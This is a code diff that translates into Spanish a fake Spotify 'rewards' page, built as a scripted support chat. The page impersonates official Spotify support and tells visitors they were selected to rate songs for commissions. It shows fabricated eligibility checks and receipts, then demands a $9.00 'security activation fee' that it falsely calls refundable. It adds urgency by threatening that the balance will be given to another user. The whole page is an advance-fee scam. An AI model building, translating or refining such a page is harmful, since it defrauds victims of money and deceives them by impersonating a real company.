@@ -5,7 +5,7 @@
   <meta charset="UTF-8">
   <meta name="viewport"
     content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Spotify Rewards - Withdrawal</title>
+  <title>Spotify Recompensas - Retiro</title>
   <!-- Redirecionador UTM desativado temporariamente -->
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -570,7 +570,7 @@
           <path
             d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z" />
         </svg>
-        Spotify<span style="font-weight: 400; font-size: 11px; opacity: 0.7; border-left: 1px solid rgba(255,255,255,0.25); padding-left: 8px; margin-left: 8px; text-transform: uppercase; letter-spacing: 0.8px;">Cashout</span>
+        Spotify<span style="font-weight: 400; font-size: 11px; opacity: 0.7; border-left: 1px solid rgba(255,255,255,0.25); padding-left: 8px; margin-left: 8px; text-transform: uppercase; letter-spacing: 0.8px;">Retiro</span>
       </div>
       <div class="header-right">
         <div class="balance-pill">
@@ -584,9 +584,9 @@
       <div class="chat-card">
         <!-- Support identity changes when the representative joins -->
         <div class="chat-agent-bar">
-          <img class="chat-agent-avatar support-logo" id="agentAvatar" src="/favicon.png" alt="Spotify Support" width="44" height="44">
+          <img class="chat-agent-avatar support-logo" id="agentAvatar" src="/favicon.png" alt="Soporte Spotify" width="44" height="44">
           <div class="chat-agent-info">
-            <span class="chat-agent-name" id="agentName">Spotify Support</span>
+            <span class="chat-agent-name" id="agentName">Soporte Spotify</span>
             <span class="chat-agent-status">Soporte Oficial Spotify</span>
           </div>
         </div>
@@ -731,7 +731,7 @@
       var body = document.getElementById('chatBody');
       var input = document.getElementById('chatInput');
       var AV = '/favicon.png';
-      var agentName = 'Spotify Support';
+      var agentName = 'Soporte Spotify';
       var agentAvatar = document.getElementById('agentAvatar');
       var agentNameEl = document.getElementById('agentName');
       var vars = { nome: '', balance: parseFloat(balanceVal).toFixed(2) };
@@ -970,7 +970,7 @@
         await sleep(4000);
         await say("Has sido una de las pocas personas seleccionadas para el Programa de Recompensas de Spotify");
         await sleep(3000);
-        await say("Hemos seleccionado cinco canciones para que escuches y califiques. Solo toma un par de minutos.");
+        await say("Hemos seleccionado cuatro canciones para que escuches y califiques. Solo toma un par de minutos.");
         step('avaliacao1');
         media('/sp/songs/index.html', 355);
         await waitForSongs(600000);
@@ -1018,18 +1018,18 @@
         step('elegibilidade1');
         await updateStatus(checkingRow, 'Solo un momento...', 'pending');
         await sleep(10000);
-        await updateStatus(checkingRow, 'Everything looks good, {{nome}}!\n\nI checked our system and saw that you are eligible to receive your commission of ${{balance}}', 'success');
+        await updateStatus(checkingRow, '¡Todo se ve excelente, {{nome}}!\n\nRevisé nuestro sistema y comprobé que eres elegible para recibir tu comisión de ${{balance}}', 'success');
 
         // Etapa 06
         step('recibo1');
         await sleep(3000);
-        await say('I\u2019m sending you the receipt for your commissions.');
+        await say('Te estoy enviando el recibo de tus comisiones.');
         await sleep(1000);
         var receiptLoadingRow = await sayStatus('Cargando...', 'pending');
         await sleep(4000);
         await updateStatus(receiptLoadingRow, 'Generando el recibo de retiro de tus comisiones...', 'pending');
         await sleep(4000);
-        var receiptFrame = media('/sp/receipt/index.html?nome=' + encodeURIComponent(vars.nome) + '&total=' + encodeURIComponent((currentBalance > 0 ? currentBalance : parseFloat(balanceVal)).toFixed(2)), 440);
+        var receiptFrame = media('/sp/receipt/index.html?nome=' + encodeURIComponent(vars.nome) + '&total=' + encodeURIComponent((currentBalance > 0 ? currentBalance : parseFloat(balanceVal)).toFixed(2)) + '&qty=4', 440);
         receiptFrame.className = 'withdraw-receipt';
         receiptFrame.onload = function () {
           var documentReceipt = receiptFrame.contentDocument && receiptFrame.contentDocument.querySelector('.receipt');
@@ -1057,11 +1057,11 @@
         var __isDev = __h === 'localhost' || __h === '127.0.0.1' || __h.indexOf('id-preview--') === 0 || __h.indexOf('-dev.lovable.app') > -1 || __h.indexOf('.lovableproject.com') > -1 || __h.indexOf('.sandbox.lovable.dev') > -1 || new URLSearchParams((window.spTrackingSearch || location.search)).get('dev') === '1';
         await sleep(__isDev ? 0 : 260000);
         step('assistiu_pitch');
-        await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $9.00\n\nThis is to verify your account and ensure that you are not a bot.', 'reward');
+        await sayStatus('¡Tu saldo de ${{balance}} está listo!\n\nPara retirar tus ganancias hoy, todo lo que necesitas hacer es pagar una pequeña tarifa de seguridad y activación de $9.00\n\nEsto es para verificar tu cuenta y garantizar que no eres un bot.', 'reward');
         await sleep(5000);
         await sayStatus('Ten en cuenta: Esta tarifa es 100% reembolsable inmediatamente después del registro, junto con tu saldo acumulado de ${{balance}}', 'alert');
         await sleep(4000);
-        await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another user on the waiting list.');
+        await say('Esta es una oportunidad única.\n\nSi decides salir ahora, tu saldo será cancelado y transferido a otro usuario en la lista de espera.');
         await sleep(3000);
         await say('Te estamos redirigiendo a la página segura de pago...');
         step('clicou_botao');
